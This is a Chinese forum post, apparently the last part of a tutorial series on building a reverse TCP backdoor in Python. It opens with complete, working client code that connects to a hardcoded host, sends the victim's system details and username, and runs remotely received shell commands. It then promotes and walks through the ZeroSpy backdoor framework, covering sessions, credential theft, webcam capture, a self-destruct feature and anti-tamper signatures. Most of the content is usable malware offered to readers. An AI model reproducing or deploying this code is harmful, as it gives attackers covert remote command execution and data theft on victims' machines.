
`connect_part2.py`

```python
# -*- coding: utf-8 -*-

import socket,subprocess as sp,sys,os,platform



# 连接函数

def connect():

    try:

        # host  = str(sys.argv[1])

        # port  = int(sys.argv[2])



        host = "192.168.14.45"   # 测试IP

        port = 3800               # 测试端口

    except Exception as e:

        sys.exit(1)



    conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    conn.connect((host,port))



    x_info = ""



    #for x in os.uname():

    for x in platform.uname():

        x_info += x + ","



    # 平台判断

    if platform.system() == "Linux":

        x_info += os.getlogin()  # Linux平台

    elif platform.system() == "Windows":

        x_info += os.getenv('username')  # Windows



    # 发送数据

    conn.send(x_info)



    # 会话维持

    interactive_session(conn)

    conn.close()



# 会话维持

def interactive_session(conn):

    while 1:

        try:

            command = str(conn.recv(1024))

        except socket.error:

            sys.exit(1)



        if command.split(" ")[0] == "exec":

            res = 1

            msg = ""



            while len(command.split(" ")) > res:

                msg += command.split(" ")[res] + " "

                res += 1



            sh = sp.Popen(msg,shell=True,

                          stdout= sp.PIPE,

                          stderr = sp.PIPE,

                          stdin= sp.PIPE)

            out,err = sh.communicate()



            result = str(out) + str(err)



            send_data(conn,result)



        elif command == "exit()":

            break

        else:

            send_data(conn,"[-] Unknown Command")

# 发送数据

def send_data(conn,data):

    length = str(len(data)).zfill(16)

    conn.send(length + data)



if __name__ == "__main__":

    connect()
```

# 0x3 最终介绍

随着某些勒索软件的教程，有些用户已经开始把文章中的代码装备到了自己写的恶意软件里。把知识用于恶意盈利，这不是作者愿意看到的局面。

这个TCP反向连接后门思路，已经事先写好了程序，并构建成了一个框架。作者实现了很多功能，比如远程导入、下载、获取root权限和升级攻击、网络摄像头、屏幕截图、情报搜集、窃取凭证等功能。为了让这个后门程序能够在大多数Linux发行版中得到充分的支持，已经尝试将其移植到各种发行版中，以解决不同的系统设计问题。

但是很不幸，作者删除了最后一个虚拟机（里面有程序最新的代码），因为硬件设备有限，只能通过利用虚拟机的方式来节省空间。如今只能把最后备份的文件贡献了出来，有兴趣的人可以把它继续开发得更加全面来帮助论坛。

为了让感兴趣的开发者了解项目中的信息，这里展示部分项目的截图。项目地址如下：

```
ZeroSpy：https：//github.com/sergeantexploiter/zero
```

### 3.1 启动界面（攻击者）

使用`python zero.py`命令在目录中启动程序。

![图片描述](https://bbs.kanxue.com/upload/attach/201902/3_YAS3B3YR3UVTKJJ.png)

这个本来有个横幅文字展示，但是为了节省展示空间，我删除掉了。输入`help`命令打印出帮助命令。这个程序首先检查状态是不是已经正常运行。是通过框架启动时加载的自定义别名文件实现的，在不同的端口上开始监听，而不是手动输入。运行状态文件使用相同的命令代码，类似在终端中输入使用的方式一样。

功能函数代码主要放置在`configurations`文件夹。使用`start_services`命令可以把程序运行起来，启动了多个监听器，使用`HASH`标签做注释。

随意使用命令，我演示的是`start_server`命令，它接受两个参数：主机和端口。如果要为主机输入空的`double/single`字符串，请改用`localhost`。只是为了帮助程序更好地显示。

![图片描述](https://bbs.kanxue.com/upload/attach/201902/3_7B5CU9F55CHM3QJ.png)

我们可以在一个监听器上接受多个客户端，就不会中断同一监听端口上的其他连接。

### 3.2 受控端界面 (受害者)

客户端脚本使用`connect.py`文件。语法是：`python connect.py <host> <port>`。客户端具有自动连接功能，如果连接失败会重新连接。

### 3.3 回连界面 (攻击者)

当客户端连接时，我们在终端上得到类似的东西。

![图片描述](https://bbs.kanxue.com/upload/attach/201902/3_WUZZ94FBYTX3FGF.png)

这不会让我们直接进入`shell`，而是将其推入后台，以便让我们继续做正在做的事情（Defaults idea）。程序可以使用`sessions`命令列出所有的会话连接。

![图片描述](https://bbs.kanxue.com/upload/attach/201902/3_PV9FW9QCQZCYF2A.png)

然后可以使用`interact`命令和会话ID进行交互。

当连接到一个客户端，有一个全新的命令集（这是在没有备份的情况下进行开发的地方）。

![图片描述](https://bbs.kanxue.com/upload/attach/201902/3_JZRG27QDC4JEVT7.png)

开发命令是 `host-scanner`（需要的线程），`check_vm`（需要更多的跨平台的结果），`webcam_list webcam_snap`（代码已经毁擦除掉的虚拟机里），检索目录（嵌入到脚本中，但不会在屏幕中显示 - 克隆给定的目录 - 取得了一些进展但也毁在虚拟机里），截图（像`lubuntu`这样的老版本和裸发行版需要更多的库支持）。加密命令（重构为使用内部安全密钥与攻击者进行第一次数据通信，DH密钥交换和AES-SHA256进行数据传输）。

在执行`sysinfo`命令后会提示`shell`（会话）的签名信息。

![图片描述](https://bbs.kanxue.com/upload/attach/201902/3_D8DFY8FFVHZ2VC2.png)

该签名首先计算并存储在脚本部署之前的散列算法。我不知道是否在旧版本中实现了攻击者的检查特性，但整个想法是在接受连接之前检查`shell`签名。这是为了防止在脚本被发现时篡改，脚本使用它自己的源代码作为签名。如果签名不匹配，连接应该会删除。如果数据传输的加密不安全(用户可以先获得签名，然后用篡改的脚本发送相同的签名)，那么该特性就可以被击败。

客户机/受害者脚本也有一个自毁特性(`sh()`在脚本中被注释掉)，这是在第一次连接时执行的。该特性使用了分解，如果不存在，则使用了一个内置的分解函数(我认为这是不安全的)。

另一个实现但失败的特性是可伸缩性。我有一个独立的程序，允许攻击者选择自己的模块并将它们编译到客户机脚本中，而不需要使用整个客户机脚本。在成功连接之后，客户端将所有可用的命令发送给攻击者。

这里有一个Bug的地方，就是当受害者客户端断开后，不会在攻击者的一侧被删除。这可以通过在`zero.py`中从连接数组和会话数组变量中删除`id`来解决。

我之所以上传这些文件，是因为其他人可能需要它，可能是因为我个人在Python脚本中看到了潜力。如果我不继续写下去，也并不意味着别人就可以牺牲晚上的时间来实现我的想法，并从我停止的地方继续开发下去。

# 0x4 参考

How To Make A Reverse TCP Backdoor In Python - Part 1

`4b8K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1j5H3P5o6l9H3M7$3g2U0i4K6u0W2L8%4u0Y4i4K6u0r3N6q4)9J5c8X3S2G2N6#2)9J5k6s2c8G2i4K6u0V1L8h3q4C8k6g2)9J5k6r3q4Q4x3X3c8J5k6i4k6W2M7Y4y4W2i4K6u0V1N6r3y4H3i4K6u0V1j5X3q4U0K9$3c8G2L8%4u0Q4x3X3c8A6L8W2)9J5k6s2m8&6N6r3S2G2L8W2)9J5k6s2m8S2M7Y4c8Q4x3X3b7I4i4K6u0r3x3e0l9K6z5l9`.`.

How To Make A Reverse TCP Backdoor In Python - Part 2

`02fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1j5H3P5o6l9H3M7$3g2U0i4K6u0W2L8%4u0Y4i4K6u0r3N6q4)9J5c8X3S2G2N6#2)9J5k6s2c8G2i4K6u0V1L8h3q4C8k6g2)9J5k6r3q4Q4x3X3c8J5k6i4k6W2M7Y4y4W2i4K6u0V1N6r3y4H3i4K6u0V1j5X3q4U0K9$3c8G2L8%4u0Q4x3X3c8A6L8W2)9J5k6s2m8&6N6r3S2G2L8W2)9J5k6s2m8S2M7Y4c8Q4x3X3b7J5i4K6u0r3x3e0l9@1x3l9`.`.

How To Make A Reverse TCP Backdoor In Python - Part 3

`4f6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1j5H3P5o6l9H3M7$3g2U0i4K6u0W2L8%4u0Y4i4K6u0r3N6q4)9J5c8X3S2G2N6#2)9J5k6s2c8G2i4K6u0V1L8h3q4C8k6g2)9J5k6r3q4Q4x3X3c8J5k6i4k6W2M7Y4y4W2i4K6u0V1N6r3y4H3i4K6u0V1j5X3q4U0K9$3c8G2L8%4u0Q4x3X3c8A6L8W2)9J5k6s2m8&6N6r3S2G2L8W2)9J5k6s2m8S2M7Y4c8Q4x3X3b7K6i4K6u0r3y4o6t1J5z5l9`.`.

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2019-2-1 16:40

被admin编辑

，原因：
